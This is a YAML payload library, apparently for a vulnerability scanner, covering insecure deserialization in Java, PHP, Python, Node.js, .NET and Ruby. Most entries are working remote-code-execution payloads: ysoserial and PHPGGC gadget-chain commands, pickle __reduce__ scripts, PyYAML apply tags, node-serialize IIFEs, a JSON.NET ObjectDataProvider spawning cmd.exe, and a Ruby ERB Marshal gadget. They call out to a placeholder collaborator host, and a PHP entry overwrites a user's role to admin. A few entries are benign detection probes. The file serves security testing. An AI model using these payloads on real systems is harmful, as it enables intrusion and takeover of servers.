defaults:
  vuln_type: deserialization
  encoding: raw
  source: ensphere

payloads:
  # ============================================================
  # Java — ysoserial gadget chains
  # ============================================================
  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: jvm
    payload: "ysoserial CommonsCollections1 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Commons Collections 1 gadget chain (Apache Commons Collections 3.x).
      Generate: java -jar ysoserial.jar CommonsCollections1 'nslookup COLLAB_DOMAIN' | base64 -w0
      Send the base64 output in the deserialization sink. Triggers DNS for OOB confirmation.
    tags: [java, ysoserial, commons_collections, rce]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: jvm
    payload: "ysoserial CommonsCollections5 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Commons Collections 5 gadget chain (Apache Commons Collections 3.x).
      Uses BadAttributeValueExpException entry point — works on JDK 8+.
      Generate: java -jar ysoserial.jar CommonsCollections5 'nslookup COLLAB_DOMAIN' | base64 -w0
    tags: [java, ysoserial, commons_collections5, rce]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: jvm
    payload: "ysoserial CommonsCollections6 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Commons Collections 6 gadget chain. Does not require SecurityManager.
      Works on Commons Collections 3.1-3.2.1.
      Generate: java -jar ysoserial.jar CommonsCollections6 'nslookup COLLAB_DOMAIN' | base64 -w0
    tags: [java, ysoserial, commons_collections6, rce]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: jvm
    payload: "ysoserial CommonsCollections7 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Commons Collections 7 gadget chain. Uses Hashtable entry point.
      Alternate chain when CC1/CC5/CC6 are blocked.
      Generate: java -jar ysoserial.jar CommonsCollections7 'nslookup COLLAB_DOMAIN' | base64 -w0
    tags: [java, ysoserial, commons_collections7, rce]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: jvm
    payload: "ysoserial CommonsBeanutils1 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Commons Beanutils 1 gadget chain. Requires commons-beanutils on classpath.
      Common in Spring/Struts apps.
      Generate: java -jar ysoserial.jar CommonsBeanutils1 'nslookup COLLAB_DOMAIN' | base64 -w0
    tags: [java, ysoserial, commons_beanutils, rce]

  - technique: deserialization_rce
    injection_surface: header
    evidence_type: dns_hit
    risk: 4
    runtime: jvm
    payload: "ysoserial CommonsCollections1 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Java deserialization via HTTP header (Cookie, X-Auth-Token, custom header).
      Many Java apps deserialize header values. Generate base64 payload and set as header value.
      Generate: java -jar ysoserial.jar CommonsCollections1 'nslookup COLLAB_DOMAIN' | base64 -w0
    tags: [java, ysoserial, header, rce]

  # Java — detection probes
  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: error
    risk: 2
    runtime: jvm
    payload: "rO0ABXQABHRlc3Q="
    notes: >
      Base64-encoded minimal Java serialized string ("test"). Magic bytes: AC ED 00 05 (rO0AB in base64).
      If the endpoint accepts this, it confirms ObjectInputStream.readObject() is reachable.
      Look for ClassNotFoundException, StreamCorruptedException, or changed behavior.
    tags: [java, detection, magic_bytes, probe]

  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 3
    runtime: jvm
    payload: "ysoserial URLDNS 'http://COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      URLDNS gadget — zero-dependency, triggers DNS lookup only (no RCE).
      Safest detection method for Java deserialization sinks.
      Generate: java -jar ysoserial.jar URLDNS 'http://COLLAB_DOMAIN' | base64 -w0
    tags: [java, ysoserial, urldns, detection, dns]

  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 3
    runtime: jvm
    payload: "ysoserial JRMPClient 'COLLAB_HOST:1099'"
    placeholders: [COLLAB_HOST]
    notes: >
      JRMP client gadget — triggers outbound RMI connection. Zero-dependency detection
      alternative to URLDNS. Generate: java -jar ysoserial.jar JRMPClient 'COLLAB_HOST:1099' | base64 -w0
    tags: [java, ysoserial, jrmp, detection, oob]

  # ============================================================
  # PHP — unserialize / PHPGGC
  # ============================================================
  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: content_match
    risk: 2
    runtime: php
    payload: "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}"
    notes: >
      Benign PHP serialized stdClass probe. If deserialized without error, confirms
      unserialize() is called on user input. stdClass is always available in PHP.
    tags: [php, unserialize, probe, detection]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: content_match
    risk: 4
    runtime: php
    payload: "a:2:{s:8:\"username\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}"
    notes: >
      PHP serialized array for privilege escalation. Overwrites role to admin
      if the app deserializes session or profile data from user input.
    tags: [php, unserialize, privesc, array]

  - technique: deserialization_rce
    injection_surface: cookie
    evidence_type: content_match
    risk: 4
    runtime: php
    payload: "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}"
    notes: >
      PHP deserialization via cookie. Common in legacy PHP apps that serialize
      session or preference data into cookies. Check Set-Cookie values for O: or a: prefixes.
    tags: [php, unserialize, cookie, detection]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: php
    payload: "phpggc Monolog/RCE1 system 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      PHPGGC Monolog RCE1 chain (Monolog 1.x/2.x). Executes via BufferHandler.
      Generate: phpggc Monolog/RCE1 system 'nslookup COLLAB_DOMAIN' -s -b
      Flags: -s = serialize, -b = base64 encode.
    tags: [php, phpggc, monolog, rce]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: php
    payload: "phpggc Laravel/RCE1 system 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      PHPGGC Laravel RCE1 chain (Laravel 5.x). Uses PendingBroadcast gadget.
      Generate: phpggc Laravel/RCE1 system 'nslookup COLLAB_DOMAIN' -s -b
      Also try Laravel/RCE2..RCE10 for different Laravel versions.
    tags: [php, phpggc, laravel, rce]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: php
    payload: "phpggc Symfony/RCE4 exec 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      PHPGGC Symfony RCE4 chain (Symfony 3.x/4.x). Uses Process component.
      Generate: phpggc Symfony/RCE4 exec 'nslookup COLLAB_DOMAIN' -s -b
      List available chains: phpggc -l | grep Symfony
    tags: [php, phpggc, symfony, rce]

  # ============================================================
  # Python — pickle
  # ============================================================
  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: python
    payload: >
      import pickle,base64;
      class Exploit:
        def __reduce__(self):
          import os; return (os.system, ('nslookup COLLAB_DOMAIN',))
      print(base64.b64encode(pickle.dumps(Exploit())))
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Python pickle RCE via __reduce__. Run this Python script locally to generate
      the base64-encoded pickle payload, then send the output to the deserialization sink.
      Triggers DNS for OOB confirmation.
    tags: [python, pickle, rce, oob]

  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    runtime: python
    payload: "gASVDAAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMBXRlc3SUhZRSlC4="
    notes: >
      Benign Python pickle payload that calls print('test'). Base64-encoded, protocol 4.
      If the server processes it, confirms pickle.loads() is called. Check for output or
      behavioral change.
    tags: [python, pickle, detection, benign]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: python
    payload: >
      import pickle,base64;
      class Exploit:
        def __reduce__(self):
          return (__import__('subprocess').check_output, (['nslookup','COLLAB_DOMAIN'],))
      print(base64.b64encode(pickle.dumps(Exploit(), protocol=2)))
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Pickle RCE using protocol 2 (Python 2/3 compatible). Uses subprocess.check_output
      for more reliable execution. Generate locally and send base64 output.
    tags: [python, pickle, rce, oob, protocol2]

  # Python — YAML unsafe_load
  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: python
    payload: "!!python/object/apply:os.system ['nslookup COLLAB_DOMAIN']"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      PyYAML RCE via !!python/object/apply tag. Exploits yaml.load() without SafeLoader
      or yaml.unsafe_load(). Works on PyYAML < 6.0 with default Loader.
    tags: [python, yaml, rce, oob]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: python
    payload: "!!python/object/new:subprocess.check_output [['nslookup', 'COLLAB_DOMAIN']]"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Alternate PyYAML RCE using !!python/object/new tag with subprocess.
      Useful when os.system is blocked but subprocess is available.
    tags: [python, yaml, subprocess, rce, oob]

  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    runtime: python
    payload: "!!python/object/apply:builtins.range [1, 10]"
    notes: >
      Benign YAML deserialization probe. Creates a range object. If parsed without error,
      confirms unsafe YAML loading is enabled (yaml.load without SafeLoader).
    tags: [python, yaml, detection, benign]

  # ============================================================
  # Node.js — node-serialize / funcster
  # ============================================================
  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: node
    payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('nslookup COLLAB_DOMAIN')}()\"}"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      node-serialize RCE via IIFE. The _$$ND_FUNC$$_ prefix triggers function
      deserialization and immediate execution in node-serialize.unserialize().
      Send as JSON body or wherever serialized data is consumed.
    tags: [node, node_serialize, rce, oob]

  - technique: deserialization_rce
    injection_surface: cookie
    evidence_type: dns_hit
    risk: 4
    runtime: node
    payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('nslookup COLLAB_DOMAIN')}()\"}"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      node-serialize RCE via cookie. Common in Express apps with insecure session
      handling that deserializes cookie values with node-serialize.
    tags: [node, node_serialize, cookie, rce, oob]

  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: content_match
    risk: 2
    runtime: node
    payload: "{\"test\":\"_$$ND_FUNC$$_function(){return 'probe'}()\"}"
    notes: >
      Benign node-serialize probe. Returns the string 'probe' if node-serialize.unserialize()
      is called. Check if response includes 'probe' or if behavior changes.
    tags: [node, node_serialize, detection, benign]

  # ============================================================
  # .NET — ysoserial.net / JSON.NET
  # ============================================================
  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: dotnet
    payload: "ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      .NET BinaryFormatter RCE via TypeConfuseDelegate gadget.
      Generate: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'nslookup COLLAB_DOMAIN' -o base64
      BinaryFormatter is the most commonly exploited .NET deserializer.
    tags: [dotnet, ysoserial_net, binary_formatter, rce]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: dotnet
    payload: "ysoserial.net -f ObjectStateFormatter -g TypeConfuseDelegate -c 'nslookup COLLAB_DOMAIN'"
    placeholders: [COLLAB_DOMAIN]
    notes: >
      .NET ObjectStateFormatter RCE. Used in ViewState deserialization.
      Generate: ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate -c 'nslookup COLLAB_DOMAIN' -o base64
      Check __VIEWSTATE parameter in ASP.NET WebForms apps.
    tags: [dotnet, ysoserial_net, viewstate, rce]

  - technique: deserialization_read
    injection_surface: json_body
    evidence_type: error
    risk: 2
    runtime: dotnet
    payload: "AAEAAAD/////AQAAAAAAAAAEAQAAAA9TeXN0ZW0uU3RyaW5nAQAAAAV2YWx1ZQEAAAAGdGVzdA=="
    notes: >
      .NET BinaryFormatter magic bytes (AAEAAAD/////) with a benign serialized string.
      If accepted, confirms BinaryFormatter deserialization is reachable.
      Look for SerializationException or changed behavior.
    tags: [dotnet, detection, magic_bytes, probe]

  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 4
    runtime: dotnet
    payload: >
      {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
       "MethodName":"Start",
       "ObjectInstance":{
         "$type":"System.Diagnostics.Process, System",
         "StartInfo":{
           "$type":"System.Diagnostics.ProcessStartInfo, System",
           "FileName":"cmd.exe",
           "Arguments":"/c nslookup COLLAB_DOMAIN"}}}
    placeholders: [COLLAB_DOMAIN]
    notes: >
      JSON.NET RCE via TypeNameHandling. Requires TypeNameHandling.All, Auto, or Objects
      in Newtonsoft.Json settings. The $type property triggers type resolution.
      Send as JSON body to endpoints that deserialize with JSON.NET.
    tags: [dotnet, json_net, type_handling, rce]

  # ============================================================
  # Ruby — Marshal.load
  # ============================================================
  - technique: deserialization_rce
    injection_surface: json_body
    evidence_type: dns_hit
    risk: 5
    runtime: ruby
    payload: >
      ruby -e '
        require "erb"; require "base64"
        payload = ERB.allocate
        payload.instance_variable_set(:@src, "system(\"nslookup COLLAB_DOMAIN\")")
        puts Base64.strict_encode64(Marshal.dump(payload))'
    placeholders: [COLLAB_DOMAIN]
    notes: >
      Ruby Marshal.load RCE via ERB gadget. Run this Ruby script locally to generate
      base64-encoded payload. Works when ERB is available (default in Ruby stdlib).
      Send the base64 output to the deserialization sink.
    tags: [ruby, marshal, erb, rce]

  - technique: deserialization_read
    injection_surface: cookie
    evidence_type: content_match
    risk: 3
    runtime: ruby
    payload: "BAhJIgp0ZXN0BjoGRVQ="
    notes: >
      Benign Ruby Marshal payload encoding the string 'test'. Base64-encoded.
      Magic bytes: 04 08 (BAh in base64). Tests if Marshal.load() is called on cookie
      or session data. Rails uses Marshal for session serialization by default.
    tags: [ruby, marshal, detection, cookie, probe]

  - technique: deserialization_rce
    injection_surface: cookie
    evidence_type: dns_hit
    risk: 5
    runtime: ruby
    payload: "RAILS_SECRET_DESER_PAYLOAD"
    placeholders: [RAILS_SECRET_DESER_PAYLOAD]
    notes: >
      Rails session cookie deserialization. If the Rails secret_key_base is known
      (e.g., from .env leak or default), craft a signed/encrypted cookie containing
      a Marshal gadget chain. Use: rails-session-cookie-cracker or custom script.
    tags: [ruby, rails, session, marshal, rce]

  # ============================================================
  # Content-Type and transport probes
  # ============================================================
  - technique: deserialization_read
    injection_surface: header
    evidence_type: content_match
    risk: 2
    payload: "application/x-java-serialized-object"
    notes: >
      Set Content-Type to Java serialization MIME type. Check if server processes
      the body differently (e.g., 500 error vs 400). Indicates Java deserialization endpoint.
    tags: [java, content_type, probe, detection]

  - technique: deserialization_read
    injection_surface: header
    evidence_type: content_match
    risk: 2
    payload: "application/x-www-form-urlencoded"
    notes: >
      Switch Content-Type from JSON to form encoding. Some frameworks auto-deserialize
      based on Content-Type and may use different (less secure) deserialization paths.
    tags: [content_type, probe, detection]

  - technique: deserialization_read
    injection_surface: header
    evidence_type: content_match
    risk: 2
    payload: "application/xml"
    notes: >
      Switch Content-Type to XML. Some frameworks (e.g., Spring, .NET WCF) auto-negotiate
      and use XML deserialization (XmlSerializer, XStream) which may have gadget chains.
    tags: [xml, content_type, probe, detection]
